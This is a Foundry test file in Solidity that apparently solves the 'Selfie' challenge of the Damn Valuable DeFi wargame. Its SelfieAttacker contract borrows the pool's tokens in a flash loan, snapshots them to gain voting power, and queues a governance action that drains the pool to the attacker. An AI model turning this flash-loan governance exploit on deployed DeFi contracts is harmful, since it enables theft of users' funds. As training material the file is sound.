// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        SelfieAttacker selfieAttacker = new SelfieAttacker();
        selfieAttacker.attack(
            attacker,
            address(selfiePool),
            TOKENS_IN_POOL,
            address(simpleGovernance)
        );

        vm.warp(block.timestamp + 2 days);

        vm.prank(attacker);
        simpleGovernance.executeAction(selfieAttacker.actionId());

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract SelfieAttacker {
    address internal attacker;
    address internal govarnance;
    uint256 public actionId;

    function attack(
        address attacker_,
        address pool,
        uint256 amount,
        address govarnance_
    ) external {
        attacker = attacker_;
        govarnance = govarnance_;

        SelfiePool(pool).flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot(token).snapshot();

        bytes memory call = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );

        actionId = SimpleGovernance(govarnance).queueAction(
            msg.sender,
            call,
            0
        );

        DamnValuableTokenSnapshot(token).transfer(msg.sender, amount);
    }
}
